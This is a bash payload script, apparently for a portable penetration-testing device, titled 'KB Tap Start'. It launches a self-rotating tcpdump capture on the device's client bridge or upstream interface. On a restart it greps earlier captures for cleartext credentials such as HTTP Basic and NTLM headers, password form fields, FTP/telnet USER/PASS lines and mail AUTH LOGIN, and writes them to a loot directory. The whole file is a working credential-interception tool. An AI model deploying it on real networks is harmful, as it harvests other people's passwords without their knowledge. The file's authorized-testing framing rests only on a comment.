#!/bin/bash
# Title: KB Tap Start
# Description: Cleartext credential tap for the network you are authorized to test. Passive tcpdump ring on br-lan + offline harvest of cleartext HTTP POST creds, Basic auth, FTP/telnet/POP/IMAP/SMTP AUTH lines, with Basic blobs decoded. No injection, no TLS interception - it only takes what clients already send unprotected. Stop with KB Tap Stop.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

# Device facts (verified 2026-09-09): stock image ships tcpdump/strings/base64/
# sha256sum (no Install payload needed). /tmp tmpfs ~125M free, /overlay ~31M ->
# ring lives in /tmp (-C 3 -W 8 = max 24M, rotation naming verified on device:
# ring.pcap0 ring.pcap1 ...), harvest text archives to /root/loot/kbtap (root
# payload - no /root-traversal problem, unlike portal CGI). Payloads run as root.

LOG green "KB Tap Start v1.0"

STATE=/root/loot/kbtap
MARKER="$STATE/active"
RING=/tmp/kbtap
mkdir -p "$STATE" "$RING" 2>/dev/null || { LOG red "cannot create dirs"; ALERT "No storage"; exit 0; }
command -v tcpdump >/dev/null 2>&1 || { LOG red "tcpdump missing (stock image ships it - odd)"; ALERT "No tcpdump"; exit 0; }

# self-heal a killed run (marker survives SIGKILL by design)
if [ -f "$MARKER" ]; then
  OLD_PID=$(sed -n 's/^PID=//p' "$MARKER" | head -1)
  LOG yellow "previous tap left running - healing"
  [ -n "$OLD_PID" ] && kill "$OLD_PID" 2>/dev/null
  OLD_R=$(sed -n 's/^RING=//p' "$MARKER" | head -1)
  # harvest before wiping, so a Stop-then-crash never loses evidence silently
  if [ -n "$OLD_R" ] && ls "$OLD_R"/ring.pcap* >/dev/null 2>&1; then
    strings -n 4 "$OLD_R"/ring.pcap* 2>/dev/null | grep -aiE 'authorization: (basic|ntlm)|pass(word)?=|pwd=|user(name)?=|login=|USER [a-z0-9._%+-]+ |PASS .|AUTH LOGIN' | sort -u | head -500 >> "$STATE/harvest.log" 2>/dev/null
  fi
  rm -rf "$OLD_R"; rm -f "$MARKER"
fi

if pidof tcpdump >/dev/null 2>&1; then
  LOG red "another tcpdump already runs (pid $(pidof tcpdump | awk '{print $1}')) - not stacking taps"
  ALERT "tcpdump busy"
  exit 0
fi

IF=$(LIST_PICKER "Tap interface" "br-lan (joined clients)" "wlan0 (upstream)") || { LOG green "cancelled - nothing started"; exit 0; }
case "$IF" in
  "wlan0 (upstream)") IF=wlan0 ;;
  *) IF=br-lan ;;
esac

setsid tcpdump -i "$IF" -n -s 0 -C 3 -W 8 -w "$RING/ring.pcap" >/dev/null 2>&1 &
sleep 2
PID=$(pidof tcpdump | awk '{print $1}')
[ -n "$PID" ] && kill -0 "$PID" 2>/dev/null || { LOG red "tcpdump died on launch"; ALERT "Tap failed"; exit 0; }

echo "PID=$PID
IF=$IF
RING=$RING
TS=$(date -u +%FT%TZ)" > "$MARKER"

LOG green "TAP LIVE: $IF  ring: $RING/ring.pcap[0-7] (24M max, self-rotating)"
LOG "harvest at Stop: cleartext HTTP creds + Basic (decoded) + FTP/telnet/mail AUTH"
LOG "pcap ring stays in /tmp until Stop (or reboot) - pull it first if you want the raw"
VIBRATE "Tap:d=6,o=6,b=250:r" || LOG yellow "vibrate skipped"
ALERT "Tap live: $IF"
exit 0
